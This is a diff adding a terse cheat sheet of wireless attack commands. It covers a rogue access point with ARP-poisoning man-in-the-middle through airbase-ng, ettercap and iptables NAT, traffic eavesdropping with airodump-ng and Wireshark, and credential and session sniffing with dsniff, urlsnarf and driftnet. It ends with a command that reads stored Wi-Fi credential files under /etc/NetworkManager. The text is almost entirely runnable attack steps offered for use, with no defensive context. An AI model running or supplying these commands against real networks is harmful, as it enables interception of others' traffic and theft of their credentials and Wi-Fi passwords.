@@ -1,0 +1,27 @@
+Man-in-the-Middle attack
+    airmon-ng start wlan0
+    airbase-ng -e RogueAP -c [channel] mon0
+    ifconfig at0 up
+    dhcpd at0
+    ifconfig at0 192.168.1.1 netmask 255.255.255.0
+    route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+    ettercap -T -q -i at0 -M arp:remote // //
+
+Wireless Eavesdropping
+    airmon-ng start wlan0
+    airodump-ng mon0
+    wireshark &
+    (Then filter with something like http, tcp.port==80, or specific destination IPs.)
+
+Session Hijacking over Wireless
+    airmon-ng start wlan0
+    airodump-ng mon0
+    driftnet -i mon0         # For image sniffing
+    dsniff -i mon0           # For general credential capture
+    urlsnarf -i mon0         # For URL monitoring
+
+Enumerating wireless security profiles
+    nmcli dev wifi list
+    cat /etc/NetworkManager/system-connections/*
